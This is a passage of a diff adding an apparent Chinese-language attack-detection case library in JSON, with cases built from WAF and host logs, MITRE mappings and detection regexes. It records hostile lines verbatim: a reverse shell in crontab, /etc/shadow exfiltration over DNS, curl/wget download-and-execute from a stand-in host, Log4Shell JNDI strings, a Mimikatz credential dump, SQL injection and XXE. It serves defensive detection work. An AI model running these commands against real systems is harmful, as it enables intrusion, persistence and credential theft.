+        "rasp": "{\"cmd_inject\": \"#!//bin/bash\"}",
+        "detection": "WAF/WEB/RASP 三源同请求（1 秒内）"
+      },
+      "signature": "Web 参数直接写文件：`/api/token?key=/var/spool/cron/root&value=*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1`——向 root crontab 注入分钟级反连任务；RASP 同请求见 cmd_inject `#!//bin/bash`（app-php-186）",
+      "reasoning": "key/value 参数直接落盘 `/var/spool/cron/root`：写 crontab 属持久化（T1053.003），`*/1` 分钟级调度 + `bash -i >& /dev/tcp/… 0>&1` 为经典反连 shell（T1059.004），`#!//bin/bash` 为 shebang 变体标记。WAF/WEB/RASP 于 05-03 16:22:50-52 同请求捕获；主机侧随后见 /etc/passwd（载体 php-fpm）。注：反连地址在日志中为占位符 `attacker`。检索无实质命中 → 新案例。",
+      "retrieval_keys": [
+        "cron",
+        "反连",
+        "bash -i",
+        "持久化",
+        "cmd_inject",
+        "app-php-186"
+      ],
+      "pattern_probes": [
+        "/var/spool/cron",
+        "dev/tcp/",
+        "bash\\s+-i"
+      ],
+      "action_sequence": [
+        "cron_root_write",
+        "bash_reverse_shell",
+        "dev_tcp_redir",
+        "shebang_cmd_inject"
+      ]
+    },
+    {
+      "id": "CASE-015",
+      "source": "WAF+WEB+RASP+HIDS",
+      "attack_type": "Web 注入组合：注册接口 cmd_inject + UNION 查询窃取凭据",
+      "kill_chain": [
+        "初始访问/执行(注册接口注入)",
+        "凭据窃取(users 表 UNION 导出)"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "indicators": {
+        "observed_targets": [
+          "app-php-17.ops-corp.com"
+        ],
+        "path": "/user/register",
+        "payload": "cmd_inject=#!//bin/bash（命令注入标记）",
+        "sqli": "id=1 UNION SELECT username,password,email FROM users LIMIT 100--（联合查询窃取凭据）",
+        "detection": "WAF/WEB/RASP 三源同请求（1 秒内）"
+      },
+      "signature": "注册接口组合注入：`/user/register?cmd_inject=#!//bin/bash` 命令注入标记；同请求 `id=1 UNION SELECT username,password,email FROM users LIMIT 100--` 联合查询窃取用户表凭据（app-php-17）",
+      "reasoning": "`UNION SELECT username,password,email FROM users` 为直接读取凭据表的联合查询注入；`cmd_inject=#!//bin/bash` 为命令注入标记（shebang 变体，与 CASE-014 同款标记再现）。WAF/WEB/RASP 于 05-07 12:53:54-56 同请求捕获；主机侧随后见 /etc/passwd（载体 php-fpm）。检索无实质命中 → 新案例。",
+      "retrieval_keys": [
+        "/user/register",
+        "cmd_inject",
+        "UNION SELECT",
+        "users",
+        "凭据窃取",
+        "#!//bin/bash",
+        "app-php-17"
+      ],
+      "pattern_probes": [
+        "cmd_inject=#!//bin/bash",
+        "UNION\\s+SELECT.*FROM\\s+users",
+        "/user/register"
+      ],
+      "action_sequence": [
+        "user_register_path",
+        "shebang_cmd_inject",
+        "union_select_users"
+      ]
+    },
+    {
+      "id": "CASE-016",
+      "source": "WAF+WEB+RASP+HIDS",
+      "attack_type": "Web 命令执行 + 路径穿越：/api/exec（cmd=id + cache_key）",
+      "kill_chain": [
+        "初始访问/执行(命令参数 + cache_key 穿越)",
+        "主机侧读取(/etc/passwd)"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059.004"
+      ],
+      "indicators": {
+        "observed_targets": [
+          "app-node-126.ops-corp.com"
+        ],
+        "path": "/api/exec?cmd=id",
+        "cache_key": "cache_key=../../../tmp/7abd7f（缓存键路径穿越）",
+        "rasp": "{\"smuggle\": \"GET / HTTP/1.1\", \"cmd\": \"cmd=id\"}",
+        "detection": "WAF/WEB/RASP 三源同请求（1 秒内）"
+      },
+      "signature": "Node 应用命令参数执行：`/api/exec?cmd=id` 探针；同请求 `cache_key=../../../tmp/7abd7f` 构成路径穿越；RASP 见走私形态标记 `smuggle=GET / HTTP/1.1`（app-node-126）",
+      "reasoning": "`/api/exec?cmd=id` 直传命令参数（命令执行探针）；`cache_key=../../../tmp/<hex>` 为目录穿越写法（与缓存写入/包含点结合可利用）；RASP 捕获 `smuggle` 字段为 HTTP 走私形态探测标记。WAF/WEB/RASP 于 05-07 19:45:59-46:01 同请求捕获；主机侧随后见 /etc/passwd（载体 /usr/bin/node）。检索命中 CASE-006（强档，共享 cmd=id 探针）——载体不同（exec 参数 vs 反序列化载荷），按技术差异新建。",
+      "retrieval_keys": [
+        "/api/exec",
+        "cmd=id",
+        "cache_key",
+        "smuggle",
+        "目录穿越",
+        "app-node-126"
+      ],
+      "pattern_probes": [
+        "/api/exec",
+        "cache_key=\\.\\./",
+        "smuggle"
+      ],
+      "action_sequence": [
+        "api_exec_path",
+        "cmd_id_probe",
+        "cache_key_traversal",
+        "smuggle_marker"
+      ]
+    },
+    {
+      "id": "CASE-017",
+      "source": "WAF+WEB+RASP+HIDS",
+      "attack_type": "PHP 框架参数覆盖命令执行（_method=__construct + filter[]=system）",
+      "kill_chain": [
+        "初始访问/执行(框架参数覆盖 → 系统过滤器)",
+        "主机侧读取(/etc/passwd)"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059.004"
+      ],
+      "indicators": {
+        "observed_targets": [
+          "app-php-54.ops-corp.com",
+          "app-rails-210.ops-corp.com"
+        ],
+        "payload": "_method=__construct&method=GET&filter[]=system（参数覆盖链）",
+        "aux_markers": [
+          "echo;id（命令探针）",
+          "order=id;SELECT sleep(5)--（时间盲注）",
+          "server[REQUEST_METHOD]=id",
+          "{\"path_traversal\": \"../config/database…\"}"
+        ],
+        "detection": "WAF/WEB/RASP 三源同请求（1 秒内）"
+      },
+      "signature": "PHP 框架参数覆盖利用：`_method=__construct&filter[]=system&method=GET` 覆盖请求处理链使 system 成为过滤器执行命令——两次观测（echo;id 探针；伴 `order=id;SELECT sleep(5)--` 时间盲注），目标轮换（app-php-54 → app-rails-210）",
+      "reasoning": "`_method=__construct` 为 ThinkPHP 类框架参数覆盖缺陷特征（经 __construct 覆盖 `filter[]` → system 过滤执行，T1190+T1059.004）。两次观测：05-08 01:26（app-php-54，携 `echo;id` 探针）、05-02 04:43（app-rails-210，携 `order=id;SELECT sleep(5)--` 时间盲注、`server[REQUEST_METHOD]=id` 与 path_traversal 标记）。WAF/WEB/RASP 均 1 秒内三源同请求；主机侧见 /etc/passwd 读取与 rc.local 植入。检索命中 CASE-005（强档，共享 echo;id 探针）——载体不同（框架参数覆盖 vs CGI 路径），按技术差异新建。",
+      "retrieval_keys": [
+        "_method=__construct",
+        "filter[]=system",
+        "ThinkPHP",
+        "参数覆盖",
+        "echo;id",
+        "server[REQUEST_METHOD]",
+        "app-php-54",
+        "app-rails-210"
+      ],
+      "pattern_probes": [
+        "_method=__construct",
+        "filter\\[\\]=system"
+      ],
+      "action_sequence": [
+        "method_construct_override",
+        "filter_system_override",
+        "echo_id_probe",
+        "time_blind_sleep",
+        "server_req_method_probe"
+      ]
+    },
+    {
+      "id": "CASE-018",
+      "source": "WAF+WEB+RASP+HIDS",
+      "attack_type": "XXE 外部实体注入（+ HTTP 走私标记）",
+      "kill_chain": [
+        "初始访问/执行(XXE 实体构造 → 内网读取尝试)",
+        "主机侧读取(/etc/passwd)"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "indicators": {
+        "observed_targets": [
+          "app-node-60.ops-corp.com"
+        ],
+        "path": "/api/v1/proxy?smuggle=GET / HTTP/1.1",
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.1…（XXE 实体指向云元数据段，日志截断）",
+        "rasp": "{\"smuggle\": \"GET / HTTP/1.1\"}",
+        "detection": "WAF/WEB/RASP 三源同请求（1 秒内）"
+      },
+      "signature": "代理接口遭 XXE：`<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.1…` 外部实体指向内网/云元数据段（日志截断）；同请求 `smuggle=GET / HTTP/1.1` 为走私形态标记（app-node-60）",
+      "reasoning": "`<!ENTITY xxe SYSTEM \"http://169.254…` 为 XXE 外部实体注入写法，目标地址落于云元数据段（169.254.169.254，日志截断至 `169.254.1`）——实体回显可达时等价 SSRF 效果。`smuggle=GET / HTTP/1.1` 与 CASE-016 同类走私标记再现。WAF/WEB/RASP 于 05-08 02:51:07-09 同请求捕获；主机侧随后见 /etc/passwd（载体 /usr/bin/node）。检索无实质命中 → 新案例。",
+      "retrieval_keys": [
+        "XXE",
+        "DOCTYPE",
+        "ENTITY",
+        "外部实体",
+        "169.254",
+        "smuggle",
+        "app-node-60"
+      ],
+      "pattern_probes": [
+        "<!ENTITY\\s+\\w+\\s+SYSTEM",
+        "<!DOCTYPE"
+      ],
+      "action_sequence": [
+        "smuggle_marker",
+        "xxe_doctype",
+        "xxe_entity_system"
+      ]
+    },
+    {
+      "id": "CASE-019",
+      "source": "HIDS",
+      "attack_type": "凭据外传：/etc/shadow 经 DNS（nslookup 循环）分片外送",
+      "kill_chain": [
+        "凭据访问(/etc/shadow 读取)",
+        "外传(DNS 查询通道分片外送)"
+      ],
+      "mitre": [
+        "T1003.008",
+        "T1048.003"
+      ],
+      "indicators": {
+        "observed_cmd": "for line in $(cat /etc/shadow | base64 -w0 | fold -w 30); do nslookup $<子域>.<域>; done",
+        "observed_domains": [
+          "svc-2f623.system.org",
+          "node-602.host.com",
+          "44314c92.ops309.com",
+          "df9167.log-358.net",
+          "node-623.cloud.io"
+        ],
+        "note": "外送域形态轮换（svc-/node-/8位hex/df9167- 前缀）；`$` 前缀表明域名由脚本变量拼接"
+      },
+      "signature": "主机凭据经 DNS 隧道外传：`cat /etc/shadow | base64 -w0 | fold -w 30` 分片后对 `$<子域>.<域>` 循环 nslookup——已五次观测，外送域轮换（svc-2f623.system.org、node-602.host.com、44314c92.ops309.com、df9167.log-358.net、node-623.cloud.io）",
+      "reasoning": "`cat /etc/shadow | base64 -w0 | fold -w 30` 将 Linux 哈希凭据（T1003.008）编码分片，逐个 `nslookup $<子域>.<域>` 外送（DNS 通道外传，T1048.003）；`$` 前缀表明域名由脚本变量拼接（外送域形态轮换，其中 44314c92.ops309.com 为 8 位 hex 前缀形态）。五次观测（05-28 14:50 至 05-29 22:00，HID0207793/HID020069* 系列），命令载体进程未在日志截断中可见。检索：命令行为无既有案例实质命中（仅通用噪声弱分）→ 新案例。",
+      "retrieval_keys": [
+        "nslookup",
+        "base64",
+        "DNS外传",
+        "凭据外传",
+        "fold -w 30"
+      ],
+      "pattern_probes": [
+        "cat\\s+/etc/shadow",
+        "base64\\s+-w0",
+        "nslookup\\s+\\$"
+      ],
+      "action_sequence": [
+        "cat_shadow",
+        "base64_w0",
+        "fold_w30",
+        "nslookup_var"
+      ]
+    },
+    {
+      "id": "CASE-020",
+      "source": "WAF+WEB+RASP",
+      "attack_type": "调度平台接口脚本注入（Groovy String.execute 风格）",
+      "kill_chain": [
+        "初始访问/执行(调度接口注入脚本执行命令)"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "indicators": {
+        "observed_targets": [
+          "app-django-176.ops-corp.com"
+        ],
+        "path": "/api/v1/dags/run?cmd_inject=;id",
+        "payload": "script=throw new Exception(\"id\".execute().text)（脚本内执行并回显）",
+        "rasp": "{\"cmd_inject\": \";id\"}",
+        "detection": "WAF/WEB/RASP 三源同请求（1 秒内）"
+      },
+      "signature": "任务调度接口（/dags/run）遭脚本注入：`cmd_inject=;id` 命令续接 + `script=throw new Exception(\"id\".execute().text)`——脚本引擎内执行 `id` 并以异常对象回显（app-django-176）",
+      "reasoning": "`dags` 路径与 `script` 参数表明针对任务调度平台（Airflow 类）的脚本执行接口；`\"id\".execute().text` 为脚本语言内执行系统命令并读取输出的写法（Groovy 风格），异常对象包裹为回显技巧。`cmd_inject=;id` 为伴随命令续接探针。WAF/WEB/RASP 于 05-29 13:58:04-06 同请求捕获。检索命中 CASE-005（中档，;id 探针共享）——载体不同（调度接口脚本引擎 vs CGI 路径），新建。",
+      "retrieval_keys": [
+        "dags",
+        "script=",
+        "execute().text",
+        "调度平台",
+        "cmd_inject",
+        "app-django-176"
+      ],
+      "pattern_probes": [
+        "dags/run",
+        "execute\\(\\)\\.text"
+      ],
+      "action_sequence": [
+        "dags_run_path",
+        "cmd_inject_semi_id",
+        "script_exec_text"
+      ]
+    },
+    {
+      "id": "CASE-021",
+      "source": "HIDS",
+      "attack_type": "Linux 启动脚本持久化：/etc/rc.local 植入（/tmp/.svc、/tmp/.implant）",
+      "kill_chain": [
+        "持久化(rc.local 启动脚本植入)"
+      ],
+      "mitre": [
+        "T1037.004"
+      ],
+      "indicators": {
+        "observed_cmds": [
+          "sed -i \"s/exit 0/\\/tmp\\/.svc -d\\nexit 0/\" /etc/rc.local（sed 插入启动项）",
+          "echo \"/tmp/.implant &\" >> /etc/rc.local（追加后台启动项）"
+        ],
+        "dropped_files": [
+          "/tmp/.svc",
+          "/tmp/.implant"
+        ],
+        "note": "两种写法共五次观测（05-01 01:11、10:23、13:34；05-02 02:20、04:45），可见载体 /bin/dash、/bin/sh"
+      },
+      "signature": "rc.local 持久化植入（两写法）：`sed -i` 将 `/tmp/.svc -d` 插到 `exit 0` 前确保执行；`echo \"/tmp/.implant &\" >> /etc/rc.local` 追加后台启动项——已五次观测（05-01 至 05-02）",
+      "reasoning": "`/etc/rc.local` 为传统开机启动脚本（T1037.004）。两种植入写法：sed 就地替换（把启动项插到 `exit 0` 之前）与 echo 追加（后台运行）；落地文件 `/tmp/.svc`、`/tmp/.implant` 为点前缀隐藏命名。五次观测（05-01 01:11、10:23、13:34 与 05-02 02:20、04:45），可见载体 /bin/dash、/bin/sh。检索无实质命中 → 新案例。",
+      "retrieval_keys": [
+        "/tmp/.svc",
+        "/tmp/.implant",
+        "开机启动",
+        "持久化",
+        "sed -i"
+      ],
+      "pattern_probes": [
+        "/etc/rc\\.local",
+        "/tmp/\\.svc",
+        "/tmp/\\.implant"
+      ],
+      "action_sequence": [
+        "rclocal_sed_insert",
+        "tmp_svc_drop",
+        "rclocal_append",
+        "tmp_implant_drop"
+      ]
+    },
+    {
+      "id": "CASE-022",
+      "source": "WAF+WEB+RASP",
+      "attack_type": "PHP 路径命令执行（fpm_path）+ 数据库 xp_dirtree UNC 外连探测",
+      "kill_chain": [
+        "初始访问/执行(PHP 路径命令参数)",
+        "外连探测(MSSQL xp_dirtree UNC)"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059.004"
+      ],
+      "indicators": {
+        "observed_targets": [
+          "app-nginx-92.ops-corp.com"
+        ],
+        "path": "/index.php/fpm_path?cmd=id",
+        "payload": "id=1; EXEC master..xp_dirtree '\\\\sync-466.metric.net\\share'--（MSSQL OOB 外连探测）",
+        "rasp": "{\"cmd\": \"id\"}",
+        "detection": "WAF/WEB/RASP 三源同请求（1 秒内）"
+      },
+      "signature": "PHP 路径参数命令执行：`/index.php/fpm_path?cmd=id`；同请求伴随 `EXEC master..xp_dirtree '\\\\sync-466.metric.net\\share'--`——借 MSSQL 存储过程触发 UNC 外连（OOB 探测/强制认证，app-nginx-92）",
+      "reasoning": "`fpm_path` 路径 + `cmd=id` 为 PHP 侧命令参数注入（RASP 见 {\"cmd\": \"id\"} 证实到达运行时）；`xp_dirtree '\\\\host\\share'` 为 MSSQL 存储过程 UNC 路径探测——触发数据库向外部主机发起 SMB 连接（OOB 外连/强制认证试探，目标 sync-466.metric.net）。WAF/WEB/RASP 于 05-01 10:21:53-55 同请求捕获。检索命中 CASE-006（强档，共享 cmd=id 探针）——载体不同（fpm_path + xp_dirtree 组合），新建。",
+      "retrieval_keys": [
+        "fpm_path",
+        "xp_dirtree",
+        "master..xp",
+        "UNC",
+        "OOB",
+        "cmd=id",
+        "app-nginx-92"
+      ],
+      "pattern_probes": [
+        "fpm_path",
+        "xp_dirtree",
+        "master\\.\\.xp_"
+      ],
+      "action_sequence": [
+        "fpm_path_param",
+        "cmd_id_probe",
+        "xp_dirtree_unc"
+      ]
+    },
+    {
+      "id": "CASE-023",
+      "source": "WAF",
+      "attack_type": "Log4j2 JNDI 注入 (Log4Shell) RCE",
+      "kill_chain": [
+        "初始访问/执行(JNDI 查找 ${jndi:ldap://...})",
+        "命令执行(加载远程恶意类)"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059.002"
+      ],
+      "indicators": {
+        "jndi_payload": "${jndi:ldap://203.0.113.50:1389/Exploit}",
+        "lookup_protocols": "ldap（可换 rmi/dns/iiop 变体）",
+        "vuln": "CVE-2021-44228",
+        "observed_paths": [
+          "/api/v1/info"
+        ],
+        "observed_payloads": [
+          "${jndi:rmi://192.0.2.44:1099/exp}（token 参数投递；rmi 协议变体）"
+        ]
+      },
+      "signature": "Web 应用查询参数携带 ${jndi:ldap://<攻击者>/...} JNDI 查找载荷——Log4j2 消息查找触发远程类加载 (Log4Shell)；已两次观测，lookup 协议轮换（ldap → rmi）",
+      "reasoning": "${jndi:...} 是 Log4j2 消息查找语法的 JNDI 注入特征（CVE-2021-44228）。Log4j 对日志消息做递归查找，JNDI lookup 会连接攻击者 LDAP 服务器加载远程恶意类实现 RCE（T1190 利用公开应用 + T1059.002 JNDI 命令执行）。协议可换 rmi/dns/iiop，属同一漏洞家族变体。 新增观测：2026-06-02 09:15 /api/v1/info?token=${jndi:rmi://192.0.2.44:1099/exp}——lookup 协议换 rmi、投递点换 token 参数，载荷形态不变，判定同一手法变体。",
+      "retrieval_keys": [
+        "Log4j",
+        "Log4Shell",
+        "JNDI",
+        "jndi",
+        "ldap",
+        "CVE-2021-44228",
+        "日志注入",
+        "T1190"
+      ],
+      "pattern_probes": [
+        "\\$\\{jndi:",
+        "jndi:(ldap|rmi|dns|iiop)"
+      ],
+      "action_sequence": [
+        "jndi_lookup"
+      ]
+    },
+    {
+      "id": "CASE-024",
+      "source": "WAF",
+      "attack_type": "Web 上传目录 JSP webshell 命令执行探针（/uploads/shell.jsp）",
+      "kill_chain": [
+        "初始访问/执行(上传目录 JSP webshell 访问)",
+        "执行(cmd=id 命令探针)"
+      ],
+      "mitre": [
+        "T1190",
+        "T1505.003"
+      ],
+      "indicators": {
+        "path": "/uploads/shell.jsp?cmd=id",
+        "webshell_note": "shell.jsp 位于上传目录且以 cmd 参数调用——上传型 JSP webshell 的典型访问形态",
+        "detection": "WAF 单层"
+      },
+      "signature": "上传目录 JSP webshell 被调用执行命令（/uploads/shell.jsp?cmd=id）：shell.jsp 命名 + /uploads/ 路径 + cmd=id 探针组合——疑似文件上传落地的 webshell 首次利用",
+      "reasoning": "请求落于上传目录 /uploads/ 下的 shell.jsp 并携带 cmd=id 命令参数：shell.jsp 命名与上传目录组合为典型 JSP webshell 访问形态（T1505.003 服务器软件组件:Web Shell），cmd=id 为命令执行验证探针（T1190 利用公开应用）。与 CASE-006/016/022 共享通用 cmd=id 探针，但利用载体不同（JSP webshell vs 反序列化载荷 / fpm_path / /api/exec 接口），按技术差异新建。证据从严：日志仅见本次访问，上传动作与命令回显均不可见。",
+      "retrieval_keys": [
+        "/uploads/shell.jsp",
+        "webshell",
+        "JSP",
+        "shell.jsp",
+        "cmd=id",
+        "T1505.003"
+      ],
+      "pattern_probes": [
+        "uploads/[a-z0-9_]+\\.jsp",
+        "shell\\.jsp"
+      ],
+      "action_sequence": [
+        "uploads_jsp_shell",
+        "cmd_id_probe"
+      ]
+    },
+    {
+      "id": "CASE-025",
+      "source": "WAF",
+      "attack_type": "Java 反序列化 RCE 尝试：/api/v2/render（deserialization 参数投递 java.util 序列化流）",
+      "kill_chain": [
+        "初始访问/执行(公开应用反序列化入口)",
+        "执行(Java 序列化流载荷投递)"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "indicators": {
+        "path": "/api/v2/render",
+        "payload": "deserialization=rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0（base64；解码为 Java 序列化流魔数 AC ED 00 05 + java.util.ArrayList 类）",
+        "detection": "WAF 单层"
+      },
+      "signature": "渲染接口 /api/v2/render 遭 Java 反序列化载荷投递：deserialization 参数携带 rO0AB 开头序列化流（java.util.ArrayList）——与 CASE-006 同魔数、不同接口载体（路径/参数形态不同）",
+      "reasoning": "POST /api/v2/render 以 deserialization 参数携带 rO0AB 开头 base64：解码为 Java 序列化流（AC ED 00 05 魔数，首个类 java.util.ArrayList），属对公开应用不安全反序列化点的 RCE 尝试（T1190）。与 CASE-006 共享 rO0AB 魔数但利用载体不同（CASE-006 为 /webtools/control/main、/api/json 且携 com.sun 系 gadget；本波为 /api/v2/render + java.util 类前缀），按技术差异新建。证据从严：仅见载荷投递，未见执行结果与后续 gadget 动作。",
+      "retrieval_keys": [
+        "反序列化",
+        "Java",
+        "rO0AB",
+        "deserialization",
+        "/api/v2/render",
+        "T1190"
+      ],
+      "pattern_probes": [
+        "deserialization=rO0AB",
+        "/api/v2/render"
+      ],
+      "action_sequence": [
+        "render_api_path",
+        "java_ser_magic"
+      ]
+    },
+    {
+      "id": "CASE-026",
+      "source": "WAF",
+      "attack_type": "Web SQL 注入：搜索接口时间盲注（/api/v2/search，' AND (SELECT sleep(5))--）",
+      "kill_chain": [
+        "侦察/初始访问(搜索接口 SQL 注入探测)",
+        "探测验证(时间盲注 sleep 延迟)"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "indicators": {
+        "path": "/api/v2/search?q=admin' AND (SELECT sleep(5))--",
+        "payload": "q=admin' AND (SELECT sleep(5))--（引号闭合 + AND 串联带 sleep 延迟子查询 + 注释截断）",
+        "detection": "WAF 单层"
+      },
+      "signature": "搜索接口遭时间盲注：q=admin' AND (SELECT sleep(5))--——引号闭合后 AND 拼接 sleep 子查询，以响应延迟判定注入结果（载体 /api/v2/search）",
+      "reasoning": "q 参数以 admin' 闭合字符串、AND 串联 (SELECT sleep(5)) 子查询并以 -- 截断：时间盲注经典写法（T1190 利用公开应用），5 秒量级为按秒验证。与 CASE-017 的辅助载荷 id;SELECT sleep(5)-- 共享 sleep 时间盲注手法，但利用载体不同（搜索接口 q 参数 vs _method=__construct 框架参数覆盖链），按技术差异新建；检索命中 CASE-017 仅弱档（time_blind_sleep 单动作）。",
+      "retrieval_keys": [
+        "SQL注入",
+        "时间盲注",
+        "sleep(5)",
+        "/api/v2/search",
+        "盲注",
+        "T1190"
+      ],
+      "pattern_probes": [
+        "'\\s*AND\\s*\\(\\s*SELECT\\s+sleep\\(",
+        "/api/v2/search"
+      ],
+      "action_sequence": [
+        "search_api_path",
+        "sqli_and_sleep"
+      ]
+    },
+    {
+      "id": "CASE-027",
+      "source": "HIDS",
+      "attack_type": "Windows 凭据窃取：Mimikatz 抓取 LSASS 凭据（sekurlsa::logonpasswords）",
+      "kill_chain": [
+        "执行(Mimikatz 工具运行)",
+        "凭据访问(LSASS 内存凭据抓取)"
+      ],
+      "mitre": [
+        "T1003.001"
+      ],
+      "indicators": {
+        "observed_cmd": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+        "note": "privilege::debug 前置提权（SeDebugPrivilege）→ sekurlsa::logonpasswords 读取 LSASS 内存凭据；exit 收尾为批处理式调用"
+      },
+      "signature": "主机执行 Mimikatz 批处理命令：mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit——提权调试后抓取 LSASS 登录凭据（典型凭据窃取）",
+      "reasoning": "sekurlsa::logonpasswords 为 Mimikatz 读取 LSASS 进程内存提取口令/哈希的模块（T1003.001 OS Credential Dumping:LSASS Memory）；privilege::debug 为其前置调试提权步骤——组合调用为工具化凭据窃取。证据从严：日志仅见命令行，未见凭据输出与后续利用。检索无实质命中（动作/关键词均零命中）→ 新案例。",
+      "retrieval_keys": [
+        "mimikatz",
+        "sekurlsa",
+        "logonpasswords",
+        "LSASS",
+        "凭据窃取",
+        "privilege::debug",
+        "T1003"
+      ],
+      "pattern_probes": [
+        "mimikatz",
+        "sekurlsa::logonpasswords"
+      ],
+      "action_sequence": [
+        "mimikatz_exec",
+        "mimikatz_privilege_debug",
+        "sekurlsa_logonpasswords"
+      ]
+    },
+    {
+      "id": "CASE-028",
+      "source": "WAF+HIDS",
+      "attack_type": "载荷下载执行链：curl/wget 拉取隐藏载荷 → /tmp 落地 → chmod +x → 执行",
+      "kill_chain": [
+        "执行/交付(下载器把载荷落地 /tmp 隐藏文件)",
+        "执行(chmod +x 后运行载荷)"
+      ],
+      "mitre": [
+        "T1105",
+        "T1059.004",
+        "T1609"
+      ],
+      "indicators": {
+        "observed_cmds": [
+          "curl -s http://203.0.113.91/x.sh -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x && crontab -l > /tmp/cron.bak（HIDS 主机侧，附 crontab 列举）",
+          "POST /containers/9f3a2b1c/exec {\"Cmd\":[\"/bin/sh\",\"-c\",\"wget -q http://203.0.113.91/b -O /tmp/.b && chmod +x /tmp/.b && /tmp/.b\"]}（WAF 侧：容器 exec API 载体，wget 变体）"
+        ],
+        "download_source": "203.0.113.91（两次观测同一拉取源）",
+        "dropped_files": [
+          "/tmp/.x",
+          "/tmp/.b"
+        ],
+        "container_exec_api": "POST /containers/<id>/exec（容器管理接口被用于执行 shell 命令）"
+      },
+      "signature": "同一拉取源 203.0.113.91 的下载执行链两次观测：HIDS 侧 curl -s http://203.0.113.91/x.sh -o /tmp/.x && chmod +x && 执行；WAF 侧容器 exec API 内 wget -q http://203.0.113.91/b -O /tmp/.b && chmod +x && 执行——下载→隐藏落地（/tmp/.x、/tmp/.b）→赋权→执行，载体轮换（主机 shell / 容器 exec API）",
+      "reasoning": "两日志同模版：从固定源 203.0.113.91 下载脚本/二进制至 /tmp 点前缀隐藏文件 → chmod +x → 立即执行（T1105 工具传输 + T1059.004 Unix Shell）；载体轮换——HIDS 侧直接 curl 落地（附 crontab -l > /tmp/cron.bak 计划任务列举），WAF 侧经容器管理接口 POST /containers/<id>/exec 投递等价 wget 命令（T1609 容器管理命令）。同一拉取源 + 同模版（下载→隐藏落地→赋权→执行）→ 合并为一个案例。证据从严：仅见命令，未见载荷内容与执行结果。检索无实质命中（动作零命中；关键词仅 CASE-014 cron 等弱分）→ 新案例。",
+      "retrieval_keys": [
+        "下载执行",
+        "落地执行",
+        "/tmp/.x",
+        "/tmp/.b",
+        "203.0.113.91",
+        "chmod +x",
+        "容器 exec",
+        "T1105"
+      ],
+      "pattern_probes": [
+        "-[oO]\\s+/tmp/\\.\\w+",
+        "chmod\\s+\\+x\\s+/tmp/\\.\\w+",
+        "post\\s+/containers/\\w+/exec"
+      ],
+      "action_sequence": [
+        "tmp_dot_download",
+        "chmod_x_tmp_dot",
+        "exec_tmp_dot"
+      ]
+    }
+  ],
+  "activity_patterns": [
+    {
+      "id": "PAT-001",
+      "pattern": "Web 利用告警 → 精确 90 秒后（自 WAF 告警计；仅有 RASP 层的波次为 88s）→ 主机横向移动（HIDS：SSH/WMIC/SMB）",
+      "occurrences": [
+        "2026-05-02 13:05:39(RASP锚) → 13:07:07｜Java 反序列化（app-tomcat-51）→ SMB 管理员共享横向（net view/net use → 10.20.10.44 C$）",
+        "2026-05-08 02:07:56 → 02:09:26｜SQLi 认证绕过+批量赋值（app-rails-38）→ SSH 到 10.20.8.183",
+        "2026-05-08 23:02:27 → 23:03:57｜Node.js 沙箱逃逸利用 → SSH 到 10.20.4.121",
+        "2026-05-15 09:55:57 → 09:57:27｜CGI 命令注入 → SSH 到 10.20.6.196",
+        "2026-05-21 02:14:10 → 02:15:40｜SSTI(Jinja2)+反序列化多向量 → WMIC 到 10.20.4.70",
+        "2026-05-21 04:38:31 → 04:40:01｜Java 反序列化 → WMIC 到 10.20.6.162",
+        "2026-05-24 05:32:13 → 05:33:43｜LFI 路径试探（CASE-003 路径复用）→ SSH 到 10.20.4.131；同日 05:38:43 起 DNS 信标波（clmiyk-4791.net），距横向 +300s"
+      ],
+      "interpretation": "7/7 复现固定节奏（WAF→HIDS 精确 90 秒，七波秒级一致）；Web 技术在轮换（Node.js/CGI/Java×2/LFI/SSTI/SQLi），横向工具在轮换（SSH/WMIC/SMB）；2026-05-24 波次另见 DNS 信标第三阶段（+300s，n=1 待验证）。注：存在仅见横向阶段、未见 web 层的波次（如 2026-05-01、2026-05-03），模式验证依赖多源日志覆盖。疑似自动化攻击战役固定 playbook（不排除合成数据模板规律，置信度：观察级）。",
+      "retrieval_keys": [
+        "88秒节奏",
+        "90秒节奏",
+        "web利用后横向移动",
+        "战役级模式"
+      ]
+    }
+  ],
+  "action_library": {
+    "whoami_probe": {
+      "label": "whoami 侦察探针",
+      "regex": "\\bwhoami\\b",
+      "generic": true
+    },
+    "cmd_id_probe": {
+      "label": "cmd=id 命令探针",
+      "regex": "cmd=id\\b",
+      "generic": true
+    },
+    "cmd_loopback_probe": {
+      "label": "cmd=127.0.0.1;id 命令探针",
+      "regex": "cmd=127\\.0\\.0\\.1;",
+      "generic": true
+    },
+    "echo_id_probe": {
+      "label": "echo;id 命令探针",
+      "regex": "echo;id",
+      "generic": true
+    },
+    "id_hostname_probe": {
+      "label": "id;hostname 侦察",
+      "regex": "id;\\s*hostname",
+      "generic": true
+    },
+    "smuggle_marker": {
+      "label": "HTTP 走私形态标记 smuggle",
+      "regex": "smuggle",
+      "generic": true
+    },
+    "sqli_tautology": {
+      "label": "SQLi 恒真绕过 ' OR '1'='1",
+      "regex": "'\\s*or\\s+'?1'?(?:\\s*=|$)",
+      "generic": false
+    },
+    "java_ser_magic": {
+      "label": "Java 序列化流魔数 rO0AB",
+      "regex": "rO0AB",
+      "generic": false
+    },
+    "wmic_remote_exec": {
+      "label": "WMIC 远程进程创建 (wmic /node:<ip>)",
+      "regex": "wmic\\s+/node:[\\d.]+",
+      "generic": false
+    },
+    "net_user_add": {
+      "label": "创建后门账户 (net user /add)",
+      "regex": "net\\s+user\\s+/add",
+      "generic": false
+    },
+    "net_localgroup_add": {
+      "label": "账户加入本地组 (net localgroup)",
+      "regex": "net\\s+localgroup\\s+ad",
